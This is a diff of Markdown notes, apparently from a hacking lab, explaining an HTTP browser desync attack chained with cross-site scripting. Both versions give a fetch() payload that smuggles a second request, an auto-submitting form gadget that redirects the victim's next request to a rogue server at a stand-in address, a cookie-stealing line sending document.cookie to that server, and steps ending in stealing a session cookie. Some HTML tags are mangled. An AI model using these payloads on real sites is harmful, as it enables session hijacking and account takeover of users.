@@ -1,64 +1,61 @@
-# HTTP Browser Desync Attack
+# Browser Desync
 
-### In a Browser Desync attack, the attacker aims to take control of a victim's account by exploiting vulnerabilities in a web application's user connection system.
+## HTTP Browser Desync Attack
 
-### This attack occurs in two steps:
+#### In a Browser Desync attack, the attacker aims to take control of a victim's account by exploiting vulnerabilities in a web application's user connection system.
 
-#### 1) The initial request, appearing legitimate, is intended to disrupt the user request queue by introducing an arbitrary request. 
+#### This attack occurs in two steps:
 
-#### 2) Once the connection pool is compromised, the very next valid request will be replaced by the arbitrary request initiated in the previous step.
+**1) The initial request, appearing legitimate, is intended to disrupt the user request queue by introducing an arbitrary request.**
 
-### Straightforward payload example:
+**2) Once the connection pool is compromised, the very next valid request will be replaced by the arbitrary request initiated in the previous step.**
 
-fetch('http://MACHINE_IP:5000/', {    method: 'POST',    body: 'GET /redirect HTTP/1.1\r\nFoo: x',    mode: 'cors',})
+#### Straightforward payload example:
 
-### Write this JavaScript Payload in your browser command line that you can write JS
+fetch('http://MACHINE\_IP:5000/', { method: 'POST', body: 'GET /redirect HTTP/1.1\r\nFoo: x', mode: 'cors',})
 
-### Command breakdown:
+#### Write this JavaScript Payload in your browser command line that you can write JS
 
-#### 1) http://MACHINE_IP = This is the URL to which the HTTP request is made for the vulnerable server. In this case, it's the registration endpoint on the local server.
+#### Command breakdown:
 
-#### 2) { method: 'POST' } = The method parameter specifies the HTTP method for the request. Here, it's set to 'POST'.
+**1) http://MACHINE\_IP = This is the URL to which the HTTP request is made for the vulnerable server. In this case, it's the registration endpoint on the local server.**
 
-#### 3) { body: 'GET /redirect HTTP/1.1\r\nFoo: x' } = In the body, there is the second request that is going to be injected into the queue.
+**2) { method: 'POST' } = The method parameter specifies the HTTP method for the request. Here, it's set to 'POST'.**
 
-#### 4) { mode: 'cors' } = This flag triggers an error when visiting the 404 web page and avoids following the redirect.
+**3) { body: 'GET /redirect HTTP/1.1\r\nFoo: x' } = In the body, there is the second request that is going to be injected into the queue.**
 
-# Browser Desync exploit chaining XSS
+**4) { mode: 'cors' } = This flag triggers an error when visiting the 404 web page and avoids following the redirect.**
 
-### One potential attack vector involves replacing the following request with an arbitrary JavaScript file to execute custom code. However, this strategy necessitates the presence of an arbitrary file upload feature on the website.
+## Browser Desync exploit chaining XSS
 
-### Instead, we can use a rogue server to deliver an XSS attack to steal the cookie from the victim. 
+#### One potential attack vector involves replacing the following request with an arbitrary JavaScript file to execute custom code. However, this strategy necessitates the presence of an arbitrary file upload feature on the website.
 
-### We can use the following gadget and deliver it to abuse any component of the web application that allows to reflect text and probably be visited by a user:
+#### Instead, we can use a rogue server to deliver an XSS attack to steal the cookie from the victim.
 
-<>form id="btn" action="http://MACHINE_NAME.COM/"
-    method="POST"
-    enctype="text/plain">
-<>textarea name="GET http://YOUR_IP HTTP/1.1
-AAA: A">placeholder1</textarea>
-<>button type="submit">placeholder2</button>
-</form>
-<><script> btn.submit() </script>
+#### We can use the following gadget and deliver it to abuse any component of the web application that allows to reflect text and probably be visited by a user:
 
-### We utilize a form because it inherently supports a keep-alive connection by default. The type is used to avoid the default encoding MIME type since we don't want to encode the second malicious request.
+<>form id="btn" action="http://MACHINE\_NAME.COM/" method="POST" enctype="text/plain"> <>textarea name="GET http://YOUR\_IP HTTP/1.1 AAA: A">placeholder1 <>button type="submit">placeholder2
 
-### Furthermore, the textarea's name attribute will overwrite the bytes of the following request, enabling redirection to our rogue server.
+<> btn.submit()&#x20;
 
-### To summarize, this gadget operates by using the initial request to position the victim within the connection context of the vulnerable server. The following request retrieves the malicious payload, compromising the victim's session.
+#### We utilize a form because it inherently supports a keep-alive connection by default. The type is used to avoid the default encoding MIME type since we don't want to encode the second malicious request.
 
-### To do so, we can set up a rogue server by serving a route with a malicious payload like fetch('http://YOUR_IP/' + document.cookie);
+#### Furthermore, the textarea's name attribute will overwrite the bytes of the following request, enabling redirection to our rogue server.
 
-### Steps to exploit a vulnerable application:
+#### To summarize, this gadget operates by using the initial request to position the victim within the connection context of the vulnerable server. The following request retrieves the malicious payload, compromising the victim's session.
 
-#### 1) Use straightforward payload to test for browser desync vulnerability
+#### To do so, we can set up a rogue server by serving a route with a malicious payload like fetch('http://YOUR\_IP/' + document.cookie);
 
-#### 2) Type in the form included to the vulnerable part of the application
+#### Steps to exploit a vulnerable application:
 
-#### 3) sudo python3 smugglingserver.py
+**1) Use straightforward payload to test for browser desync vulnerability**
 
-#### 4) sudo python3 -m http.server 8080
+**2) Type in the form included to the vulnerable part of the application**
 
-#### 5) Send the request
+**3) sudo python3 smugglingserver.py**
 
-#### 6) After one minute or so, we steal the user's session cookie
+**4) sudo python3 -m http.server 8080**
+
+**5) Send the request**
+
+**6) After one minute or so, we steal the user's session cookie**
